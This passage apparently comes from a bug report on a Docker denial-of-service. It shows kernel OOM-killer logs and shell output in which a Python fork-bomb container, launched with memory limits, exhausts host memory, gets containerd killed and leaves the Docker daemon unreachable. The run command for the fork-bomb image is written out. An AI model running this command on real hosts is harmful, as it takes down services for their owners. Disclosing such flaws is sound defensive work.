[Thu May 14 23:17:24 2020] [    893]   101   893     6045     3332    86016        0             0 systemd-resolve
[Thu May 14 23:17:24 2020] [    939]     0   939    60254     2365   102400        0             0 accounts-daemon
[Thu May 14 23:17:24 2020] [    947]     0   947     2134      747    49152        0             0 cron
[Thu May 14 23:17:24 2020] [    949]   103   949     1881     1178    57344        0          -900 dbus-daemon
[Thu May 14 23:17:24 2020] [    958]     0   958    20478      931    57344        0             0 irqbalance
[Thu May 14 23:17:24 2020] [    963]   104   963    56119     1595    73728        0             0 rsyslogd
[Thu May 14 23:17:24 2020] [    966]     0   966     4222     2049    65536        0             0 systemd-logind
[Thu May 14 23:17:24 2020] [    972]     0   972      948      573    49152        0             0 atd
[Thu May 14 23:17:24 2020] [    988]     0   988     3040     1819    57344        0         -1000 sshd
[Thu May 14 23:17:24 2020] [   1037]     0  1037     1838      535    53248        0             0 agetty
[Thu May 14 23:17:24 2020] [   1060]     0  1060     1457      450    45056        0             0 agetty
[Thu May 14 23:17:24 2020] [   1203]     0  1203    59101     2290    94208        0             0 polkitd
[Thu May 14 23:17:24 2020] [   1779]     0  1779      622      147    45056        0             0 none
[Thu May 14 23:17:24 2020] [ 181470]     0 181470     5028     1510    61440        0             0 nginx
[Thu May 14 23:17:24 2020] [ 198207]   112 198207     6306     2950    73728        0             0 nginx
[Thu May 14 23:17:24 2020] [1129252]     0 1129252     5715     3553    90112        0             0 systemd
[Thu May 14 23:17:24 2020] [1928036]     0 1928036     3850     2732    77824        0             0 sshd
[Thu May 14 23:17:24 2020] [1928238]     0 1928238     3506     2306    61440        0             0 bash
[Thu May 14 23:17:24 2020] [2197868]     0 2197868     3443     2283    57344        0             0 sshd
[Thu May 14 23:17:24 2020] [2198133]     0 2198133     3744     2513    69632        0             0 bash
[Thu May 14 23:17:24 2020] [2221214]     0 2221214     3444     2239    61440        0             0 sshd
[Thu May 14 23:17:24 2020] [2221374]     0 2221374     3346     2094    65536        0             0 bash
[Thu May 14 23:17:24 2020] [2296209]     0 2296209  4841483    23552  2670592        0             0 containerd
[Thu May 14 23:17:24 2020] [3042347]     0 3042347  5287337    39430  3727360        0          -500 dockerd
[Thu May 14 23:17:24 2020] [3123537]     0 3123537     1869      597    53248        0             0 dmesg
[Thu May 14 23:17:24 2020] [3143502]     0 3143502   321041    14927   368640        0             0 docker
[Thu May 14 23:17:24 2020] [3143518]     0 3143518     4795      858    61440        0             0 systemd-udevd
[Thu May 14 23:17:24 2020] [3143519]     0 3143519     4795      858    61440        0             0 systemd-udevd
[Thu May 14 23:17:24 2020] [3143526]     0 3143526     4795      841    61440        0             0 systemd-udevd
[Thu May 14 23:17:24 2020] [3143544]     0 3143544     4795      841    61440        0             0 systemd-udevd
[Thu May 14 23:17:24 2020] [3143546]     0 3143546     4795      841    61440        0             0 systemd-udevd
[Thu May 14 23:17:24 2020] [3143547]     0 3143547     4795      820    61440        0             0 systemd-udevd
[Thu May 14 23:17:24 2020] [3143553]     0 3143553     4795      739    61440        0             0 systemd-udevd
[Thu May 14 23:17:24 2020] [3143554]     0 3143554     4795      723    61440        0             0 systemd-udevd
[Thu May 14 23:17:24 2020] [3143555]     0 3143555     4795      707    61440        0             0 systemd-udevd
[Thu May 14 23:17:24 2020] [3143597] 231072 3143597     2918     2006    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143599] 231072 3143599     2982     1976    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143601] 231072 3143601     2982     2070    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143605] 231072 3143605     2918     1954    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143606] 231072 3143606     2982     2070    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143608] 231072 3143608     2982     1541    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143609] 231072 3143609     2918     2006    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143612] 231072 3143612     2918     2004    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143613] 231072 3143613     2918     2006    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143615] 231072 3143615     2982     2070    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143616] 231072 3143616     2982     1077    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143617] 231072 3143617     2982     2070    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143619] 231072 3143619     2854     1982    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143620] 231072 3143620     2918     2001    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143622] 231072 3143622     2982     2068    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143623] 231072 3143623     2918     1988    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143624] 231072 3143624     2854     1982    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143625] 231072 3143625     2982     2070    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143626] 231072 3143626     2982     1077    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143627] 231072 3143627     2982     1077    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143629] 231072 3143629     2918     2006    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143630] 231072 3143630     2982     1422    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143631] 231072 3143631     2982     2066    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143632] 231072 3143632     2982     1957    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143633] 231072 3143633     2982     1958    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143634] 231072 3143634     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143635] 231072 3143635     2982     1842    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143636] 231072 3143636     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143637] 231072 3143637     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143638] 231072 3143638     2982     1942    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143639] 231072 3143639     2982     1822    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143640] 231072 3143640     2982     1822    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143641] 231072 3143641     2982     1077    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143642] 231072 3143642     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143643] 231072 3143643     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143644] 231072 3143644     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143645] 231072 3143645     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143646] 231072 3143646     2982     1865    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143647] 231072 3143647     2982     1957    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143648] 231072 3143648     2982     1954    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143649] 231072 3143649     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143650] 231072 3143650     2982     1958    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143651] 231072 3143651     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143652] 231072 3143652     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143653] 231072 3143653     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143654] 231072 3143654     2982     1077    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143656] 231072 3143656     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143655] 231072 3143655     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143657] 231072 3143657     2982     1958    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143658] 231072 3143658     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143659] 231072 3143659     2982     1957    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143660] 231072 3143660     2982     1077    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143661] 231072 3143661     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143662] 231072 3143662     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143663] 231072 3143663     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143664] 231072 3143664     2982     1077    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143665] 231072 3143665     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143666] 231072 3143666     2982     1954    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143667] 231072 3143667     2982     1077    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143668] 231072 3143668     2982     1953    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143669] 231072 3143669     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143670] 231072 3143670     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143671] 231072 3143671     2982     1958    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143672] 231072 3143672     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143673] 231072 3143673     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143674] 231072 3143674     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143675] 231072 3143675     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143676] 231072 3143676     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143677] 231072 3143677     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143678] 231072 3143678     2982     1958    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143679] 231072 3143679     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143680] 231072 3143680     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143681] 231072 3143681     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143682] 231072 3143682     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143683] 231072 3143683     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143684] 231072 3143684     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143685] 231072 3143685     2982     1958    57344        0             0 python3
[Thu May 14 23:17:24 2020] [3143686] 231072 3143686     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143687] 231072 3143687     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143688] 231072 3143688     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143689] 231072 3143689     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143690] 231072 3143690     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143691] 231072 3143691     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143692]     0 3143692     2559      228    53248        0             0 runc
[Thu May 14 23:17:24 2020] [3143693] 231072 3143693     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] [3143694] 231072 3143694     2982     1077    53248        0             0 python3
[Thu May 14 23:17:24 2020] oom-kill:constraint=CONSTRAINT_NONE,nodemask=(null),cpuset=3a166877f91031145f6dc491df3c915c57f1439f4b3bcea4c6a37d1885ea27ea,mems_allowed=0,global_oom,task_memcg=/system.slice/containerd.service,task=containerd,pid=2296209,uid=0
[Thu May 14 23:17:24 2020] Out of memory: Killed process 2296209 (containerd) total-vm:19365932kB, anon-rss:59336kB, file-rss:34872kB, shmem-rss:0kB, UID:0 pgtables:2608kB oom_score_adj:0
[Thu May 14 23:17:24 2020] SLUB: Unable to allocate memory on node -1, gfp=0xcc0(GFP_KERNEL)
[Thu May 14 23:17:24 2020]   cache: task_struct(632851:3a166877f91031145f6dc491df3c915c57f1439f4b3bcea4c6a37d1885ea27ea), object size: 6016, buffer size: 6016, default order: 3, min order: 1
[Thu May 14 23:17:24 2020]   node 0: slabs: 47, objs: 227, free: 0
[Thu May 14 23:17:24 2020] oom_reaper: reaped process 2296209 (containerd), now anon-rss:0kB, file-rss:14180kB, shmem-rss:0kB
```

## Shell output of exemplary run

The docker daemon crashed during container execution:

``` shell
root@production:~# docker run -it --rm --memory=128M --kernel-memory=16M lmmdock/fork-bomb
Traceback (most recent call last):
Traceback (most recent call last):
Traceback (most recent call last):
Traceback (most recent call last):
  File "/bomb.py", line 6, in <module>
  File "/bomb.py", line 6, in <module>
  File "/bomb.py", line 6, in <module>
  File "/bomb.py", line 6, in <module>
Traceback (most recent call last):
Traceback (most recent call last):
Traceback (most recent call last):
  File "/bomb.py", line 6, in <module>
  File "/bomb.py", line 6, in <module>
  File "/bomb.py", line 6, in <module>
Traceback (most recent call last):
  File "/bomb.py", line 6, in <module>
Traceback (most recent call last):
Traceback (most recent call last):
  File "/bomb.py", line 6, in <module>
Traceback (most recent call last):
  File "/bomb.py", line 6, in <module>
Traceback (most recent call last):
Traceback (most recent call last):
  File "/bomb.py", line 6, in <module>
Traceback (most recent call last):
  File "/bomb.py", line 6, in <module>
  File "/bomb.py", line 6, in <module>
  File "/bomb.py", line 6, in <module>
Traceback (most recent call last):
Traceback (most recent call last):
  File "/bomb.py", line 6, in <module>
  File "/bomb.py", line 6, in <module>
Traceback (most recent call last):
Traceback (most recent call last):
Traceback (most recent call last):
Traceback (most recent call last):
Traceback (most recent call last):
  File "/bomb.py", line 6, in <module>
Traceback (most recent call last):
  File "/bomb.py", line 6, in <module>
Traceback (most recent call last):
  File "/bomb.py", line 6, in <module>
    os.fork()
  File "/bomb.py", line 6, in <module>
Traceback (most recent call last):
    os.fork()
OSError: [Errno 12] Cannot allocate memory
  File "/bomb.py", line 6, in <module>
    os.fork()
  File "/bomb.py", line 6, in <module>
Traceback (most recent call last):
  File "/bomb.py", line 6, in <module>
Traceback (most recent call last):
    os.fork()
OSError: [Errno 12] Cannot allocate memory
    os.fork()
OSError: [Errno 12] Cannot allocate memory
  File "/bomb.py", line 6, in <module>
Traceback (most recent call last):
  File "/bomb.py", line 6, in <module>
OSError: [Errno 12] Cannot allocate memory
    os.fork()
    os.fork()
  File "/bomb.py", line 6, in <module>
    os.fork()
    os.fork()
OSError: [Errno 12] Cannot allocate memory
    os.fork()
    os.fork()
OSError: [Errno 12] Cannot allocate memory
OSError: [Errno 12] Cannot allocate memory
OSError: [Errno 12] Cannot allocate memory
    os.fork()
    os.fork()
OSError: [Errno 12] Cannot allocate memory
    os.fork()
OSError: [Errno 12] Cannot allocate memory
    os.fork()
OSError: [Errno 12] Cannot allocate memory
OSError: [Errno 12] Cannot allocate memory
OSError: [Errno 12] Cannot allocate memory
OSError: [Errno 12] Cannot allocate memory
OSError: [Errno 12] Cannot allocate memory
    os.fork()
    os.fork()
OSError: [Errno 12] Cannot allocate memory
OSError: [Errno 12] Cannot allocate memory
    os.fork()
    os.fork()
    os.fork()
OSError: [Errno 12] Cannot allocate memory
    os.fork()
OSError: [Errno 12] Cannot allocate memory
OSError: [Errno 12] Cannot allocate memory
OSError: [Errno 12] Cannot allocate memory
    os.fork()
    os.fork()
OSError: [Errno 12] Cannot allocate memory
OSError: [Errno 12] Cannot allocate memory
    os.fork()
failed to resize tty, using default size
                                        ERRO[0004] error waiting for container: unexpected EOF  
root@production:~# docker ps -a
Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?
```
